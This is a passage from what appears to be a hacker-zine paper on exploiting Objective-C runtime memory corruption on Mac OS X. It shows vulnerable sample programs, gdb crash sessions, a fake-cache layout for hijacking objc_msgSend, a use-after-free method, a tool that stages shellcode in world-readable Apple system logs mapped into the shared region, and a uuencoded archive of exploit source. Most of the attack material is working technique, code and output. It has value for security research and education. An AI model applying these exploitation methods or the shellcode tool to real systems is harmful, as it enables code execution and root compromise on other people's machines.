+talker: 0x103540
+bash-3.2# id
+uid=0(root)
+
+Hopefully in this section I have provided a viable method of exploiting
+heap overflows in an Objective-c Environment.
+
+Another technique revolving around overflowing Objective-C meta-data is an
+overflow on the .bss section. This section is used to store static/global
+data that is initially zero filled.
+
+Generally with the way gcc lays out the binary, the __class section comes
+straight after the .bss section. This means that a largish overflow on the
+.bss will end up overwriting the isa class definition structs, rather than
+the instantiated classes themselves, as in the previous example.
+
+In order to test out what will happen we can modify our previous example to
+move buf from the heap to the .bss. I also changed the printf responsible
+for printing the address of the Talker class, to deref the first element
+and print the address of it's isa instead.
+
+#include <stdio.h>
+#include <stdlib.h>
+#import "Talker.h"
+
+char buf[25];
+
+int main(int ac, char **av) 
+{
+        Talker *talker = [[Talker alloc] init];
+        printf("buf: 0x%x\n",buf);
+        printf("talker isa: 0x%x\n",*(long *)talker);
+        if(ac != 2) {
+                exit(1);
+        }
+        strcpy(buf,av[1]);
+        [talker say: "Hello World!"];
+        [talker release];
+}
+
+When we compile this and run it in gdb, we can see a couple of things.
+Firstly, that the talkers isa struct is only around 4096 bytes apart from
+our buffer. 
+
+(gdb) r `perl -e'print "A"x4150'`
+Starting program: /Users/dcbz/code/ofex2/build/hello `perl -e'print
+"A"x4150'`
+Reading symbols for shared libraries +++++...................... done
+buf: 0x2040
+talker isa: 0x3000
+
+We also get a crash in the following instruction:
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x41414141
+0x94e0c68c in objc_msgSend ()
+(gdb) x/i $pc
+0x94e0c68c <objc_msgSend+28>:   mov    0x0(%edi),%esi
+(gdb) i r edi
+edi            0x41414141       1094795585
+
+This instruction looks pretty familiar from our previous example.
+As you can guess, this instruction is looking up the cache pointer, exactly
+the same as our previous example. The only real difference is that we're
+skipping a step. Rather than overflowing the ISA pointer and then creating
+a fake ISA struct, we simply have to create a fake cache in order to gain
+control of execution.
+
+I'm not going to bother playing this one out for you guys in the paper,
+cause this monster is already getting quite long as it is. I'll include the
+sample code in the uuencoded section at the end though, feel free to play
+with it.
+
+As you can imagine, you simply need to set up memory as such:
+
+       ,_____________________,
+       |        mask=0       |   
+       |      occupied       |   
+   ,---|      buckets        |    
+   '-->| fake bucket: SEL    |   
+       | fake bucket: unused |   
+       | fake bucket: IMP    |-----,
+       |     SHELLCODE       |<----'
+       '_____________________'
+
+and point edi to the start of it to gain control of execution.
+
+These two techniques provide some of the easiest ways to gain control of
+execution from a heap or .bss overflow that i've seen on Mac OS X.
+
+The last type of bug which I will explore in this paper, is the double 
+"release". This is a double free of an Objective-C object.
+
+The following code demonstrates this situation.
+
+#include <stdio.h>
+#include <stdlib.h>
+#import "Talker.h"
+
+
+int main(int ac, char **av)
+{
+        Talker *talker = [[Talker alloc] init];
+        printf("talker: 0x%x\n",talker);
+        printf("Talker is: %i bytes.\n", sizeof(Talker));
+        if(ac != 2) {
+                exit(1);
+        }
+        char *buf  = strdup(av[1]);
+        printf("buf @ 0x%x\n",buf);
+        [talker say: "Hello World!"];
+        [talker release];	// Free
+        [talker release];	// Free again...
+}
+
+If we compile and execute this code in gdb, the following situation occurs:
+
+
+-[dcbz@megatron:~/code/p66-objc/ofex3]$ gcc Talker.m hello.m
+-framework Foundation -o hello
+-[dcbz@megatron:~/code/p66-objc/ofex3]$ gdb ./hello
+GNU gdb 6.3.50-20050815 (Apple version gdb-768) 
+Copyright 2004 Free Software Foundation, Inc.
+
+(gdb) r AA
+Starting program: /Users/dcbz/code/p66-objc/ofex3/hello AA
+talker: 0x103280
+Talker is: 4 bytes.
+buf @ 0x1032d0
+Hello World!
+objc[1288]: FREED(id): message release sent to freed object=0x103280
+
+Program received signal EXC_BAD_INSTRUCTION, Illegal instruction/operand.
+0x90c65bfa in _objc_error ()
+(gdb) x/i $pc
+0x90c65bfa <_objc_error+116>:   ud2a   
+(gdb) 
+
+This ud2a instruction is guaranteed to throw an Illegal instruction and
+terminate the process. This is Apple's protection against double releases.
+
+If we look at what's happening in the source we can see why this occurs.
+
+__private_extern__ IMP _class_lookupMethodAndLoadCache(Class cls, SEL sel)
+{
+    Class curClass;
+    IMP methodPC = NULL;
+
+    // Check for freed class
+    if (cls == _class_getFreedObjectClass())
+        return (IMP) _freedHandler;
+
+As you can see, when the lookupMethodAndLoadCache function is called, 
+(when the release method is called) the cls pointer is compared with the
+result of the _class_getFreeObjectClass() function. This function returns
+the address of the previous class which was released by the runtime. If a
+match is found, the _freedHandler function is returned, rather than the
+desired method implementation. _freedHandler is responsible for outputting
+a message in syslog() and then using the ud2a instruction to terminate the
+process.
+
+This means that any method call on a free()'ed object will always
+error out. However, if another object is released inbetween, the behaviour
+is different.
+
+To investigate this we can use the following program:
+
+#include <stdio.h>
+#include <stdlib.h>
+#import "Talker.h"
+
+
+int main(int ac, char **av)
+{
+        Talker *talker = [[Talker alloc] init];
+        Talker *talker2 = [[Talker alloc] init];
+        printf("talker: 0x%x\n",talker);
+        printf("talker is: %i bytes.\n", malloc_size(talker));
+        if(ac != 2) {
+                exit(1);
+        }
+        [talker release];
+        [talker2 release];
+        int i;
+        for(i=0; i<=50000 ; i++) {
+                char *buf  = strdup(av[1]);
+        //printf("buf @ 0x%x\n",buf);
+                // leak badly
+        }
+        [talker say: "Hello World!"];
+        [talker release];
+}
+
+If we run this, with gdb attached, we can see that it crashes in the
+following instruction.
+
+(gdb) r aaaa
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /Users/dcbz/code/p66-objc/ofex3/hello aaaa
+talker: 0x103280
+talker is: 16 bytes.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x61616181
+0x90c75688 in objc_msgSend ()
+(gdb) x/i $pc
+0x90c75688 <objc_msgSend+24>:   mov    edi,DWORD PTR [edx+0x20]
+
+As you can see, this instruction (objc_msgSend+24) is our objc_msgSend call 
+trying to look up the cache pointer from our object. The ISA pointer in edx
+contains the value 61616161 ("aaaa"). This is because our little for loop
+of heap allocations, eventually filled in the gaps in the heap, and
+overwrote our free'ed object. 
+
+Once we control the ISA pointer in this instruction, the situation is again
+identical to a standard heap overflow of an Objective-C object.
+
+I will leave it again as an exercize for the reader to implement this.
+
+------[ 6.1 - Side note: Updated shared_region technique.
+
+In the previous section we used the shared_region technique to store our
+code in a fixed location in the address space of our vulnerable
+application. However, in order to do so, we required a file that was owned
+by root and controllable/readable by us. 
+
+The file that we used:
+
+8 -rw-rw-r--  1 root  admin  4096 Apr 12 17:30 /Applications/.localized
+
+Was only writeable by the admin user, so this isn't really a viable
+solution to the problem apple presented us with.
+
+As I said earlier, I've been away from Mac OS X for a while, so I haven't
+had a chance to get around this new check, in the past. While I was writing
+this paper I was contemplating possible methods of defeating it.
+
+My first thought, was to find a suid which created a root owned file,
+controllable by us, and then sigstop it. However I did not find any suids
+which met our requirements with this.
+
+I also tried mounting a volume obeying file ownership which contained a
+previously created root owned file. However there is a check in the syscall
+which makes sure that our file is on the root volume, so that was outed.
+
+Finally I thought about log files. Something like syslog would be perfect
+where I could arbitrarily control the contents. The only problem with this
+idea is that no one in their right mind would allow their syslog to be
+world readable.
+
+This is when I stumbled across the "Apple system log facility." A.S.L?
+Amazingly apple took it upon themselves to reinvent the wheel. Apple syslog
+is designed to be readable by everyone on the system. By default any user
+can see sudo messages etc.
+
+The man page describes ASL as follows:
+
+DESCRIPTION
+
+These routines provide an interface to the Apple system log facility.  They
+are intended to be a replacement for the syslog(3) API, which will continue
+to be supported for backwards compatibility.  The new API allows client
+applications to create flexible, structured messages and send them to the
+syslogd server, where they may undergo additional processing.  Messages
+received by the server are saved in a data store (subject to input filtering
+constraints).  This API permits clients to create queries and search the
+message data store for matching messages.
+
+There's even a section on security that seems to think allowing everyone to
+view your system log is a good thing...
+
+SECURITY
+
+Messages that are sent to the syslogd server may be saved 
+in a message store.  The store may be searched using asl_search, as 
+described below.  By default, all messages are readable by any user.
+However, some applications may wish to restrict read access for some 
+messages.  To accommodate this, a client may set a value for the "ReadUID" 
+and "ReadGID" keys.  These keys may be associated with a value
+containing an ASCII representation of a numeric UID or GID.  Only the 
+root user (UID 0), the user with the given UID, or a member of the group with  
+the given GID may fetch access-controlled messages from the database.
+
+So basically we can use the "asl_log()" function to add arbitrary data to
+the log file. The log file is stored in /var/log/asl/YYYY.MM.DD.asl and as
+you can see below this file is world readable. This works perfect for what
+we need.
+
+344 -rw-r--r--  1 root  wheel  172377 Apr 12 18:40
+/var/log/asl/2009.04.12.asl
+
+I wrote a tool "14-f-brazil.c" which basically takes some shellcode in
+argv[1] then sends it to the latest asl log with asl_log(). It then maps
+the last page of the log file straight into the shared section.
+
+I stuck a unique identifier:
+
+        #define NEMOKEY "--((NEMOKEY))--:>>"
+
+before the shellcode in memory, and then just scanned memory in the shared
+mapping in the current process in order to locate the key, and therefore 
+our shellcode.
+
+Here is the output from running the program:
+
+-[dcbz@megatron:~/code]$ ./14-f-brazil `perl -e'print "\xcc"x20'`
+[+] opening logfile: /var/log/asl/2009.04.12.asl.
+[+] generating shellcode buffer to log.
+[+] writing shellcode to logfile.
+[+] creating shared mapping.
+[+] file offset: 0x16000
+[+] Waiting a bit.
+[+] scanning memory for the shellcode... (this may crash).
+[+] found shellcode at: 0x9ffff674.
+
+
+And as you can see in gdb, we have a nopsled at that address.
+
+-[dcbz@megatron:~/code]$ gdb /bin/sh
+GNU gdb 6.3.50-20050815 (Apple version gdb-768) 
+
+(gdb) r
+Starting program: /bin/sh
+^C[Switching to process 342 local thread 0x2e1b]
+0x8fe01010 in __dyld__dyld_start () 
+Quit
+(gdb) x/x 0x9ffff674
+0x9ffff674:     0x90909090
+(gdb)
+0x9ffff678:     0x90909090  
+(gdb)
+0x9ffff67c:     0x90909090
+(gdb)
+0x9ffff680:     0x90909090
+(gdb)
+0x9ffff684:     0x90909090
+
+Andrewg predicts that after this paper Apple will add a check to make sure
+that the file is executable, prior to mapping it into the shared section.
+
+Should be interesting to see if they do this. :p
+
+I'll include 14-f-brazil.c in the uuencoded code at the end of this paper.
+
+--[ 6 - Conclusion
+
+Wow I can't believe you guys actually read this far. That was a pretty long
+and painful ride. It seems like every time I start writing I remember how much I
+dislike writing and vow never to do it again, but after a few months I
+always forget and start on another topic. Hopefully this wasn't as dry and
+boring in .txt format as it was in .ppt, although I'm definitly missing
+lolcat pictures in this version :(.
+
+I would like to take this time to thank the support drone at the Apple shop
+who fixed my Macbook for me after it was broken for the last 3 years.
+Without his help, there's no way I would have ever finished this paper.
+
+Again I'd like to thank my wife for her support.  Also thanks to
+cloudburst/andrewg and the rest of felinemenace as well as various other
+people for discussing this stuff with me and allowing me to bounce ideas
+off you, TEAM HANZO reprezent! Thanks to dino and thoth for reading over 
+the paper before I published it, to make sure I didn't say anything TOO 
+stupid. ;-)
+
+Anyone interested enough to read this far should definitly check out the
+Mac Hacker's Handbook. I haven't as of yet been able to buy a copy, I guess
+they're all sold out in Australia, but from what I've seen so far the book
+looks great.
+
+later!
+
+- nemo
+
+--[ 7 - References
+
+[1] -
+http://developer.apple.com/documentation/Cocoa/Conceptual/ObjectiveC/  \
+                       Introduction/introObjectiveC.html
+[2] - 
+http://en.wikipedia.org/wiki/Objective-C
+
+[3] - Compiling Objective-C without xcode on OS X.
+http://www.w3style.co.uk/compiling-objective-c-without-xcode-in-os-x
+
+[4] -  CLOS: Integrating object-orientated and functional programming.
+http://portal.acm.org/citation.cfm?doid=114669.114671
+
+[5] - Objective-C Runtime Source.
+http://www.opensource.apple.com/darwinsource/tarballs/apsl/objc4-371.2.tar.gz
+
+[6] - Mach-O File Format
+http://developer.apple.com/documentation/DeveloperTools/Conceptual/MachORuntime/Reference/reference.html
+
+[7] - The Objective-C Runtime 2.0:
+http://developer.apple.com/DOCUMENTATION/Cocoa/Reference/ObjCRuntimeRef/ObjCRuntimeRef.pdf
+
+[8] - The Objective-C Runtime 1.0:
+http://developer.apple.com/DOCUMENTATION/Cocoa/Reference/ObjCRuntimeRef1/ObjCRuntimeRef1.pdf
+
+[9] - Objective-C Runtime Guide:
+http://developer.apple.com/DOCUMENTATION/Cocoa/Conceptual/ObjCRuntimeGuide/ObjCRuntimeGuide.pdf
+
+[10] - Objective-C Beginner's Guide
+http://www.otierney.net/objective-c.html
+
+[11] - OS X heap exploitation techniques  
+http://www.phrack.com/issues.html?issue=63&id=5
+
+[12] - Mac OS X Debugging Magic
+http://developer.apple.com/technotes/tn2004/tn2124.html
+
+[13] - Mac OS X wars - a XNU Hope
+http://www.phrack.com/issues.html?issue=64&id=11#article
+
+[14] - class-dump
+http://www.codethecode.com/projects/class-dump
+
+[15] - OTX 
+http://otx.osxninja.com/
+
+[16] - fixobjc.idc
+http://nah6.com/~itsme/cvs-xdadevtools/ida/idcscripts/fixobjc.idc
+
+[17] - Charlie Miller - Owning the fanboys
+http://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Miller/BlackHat-Japan-08-Miller-Hacking-OSX.pdf
+
+[18] - F-Script
+http://www.fscript.org
+
+[19] - Reverse engineering - PowerPC Cracking on OSX with GDB
+http://phrack.org/issues.html?issue=63&id=16#article
+
+[20] - HTE
+http://hte.sourceforge.net
+
+--[ 8 - Appendix A: Source code
+
+begin 644 p66-objc.tgz
+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
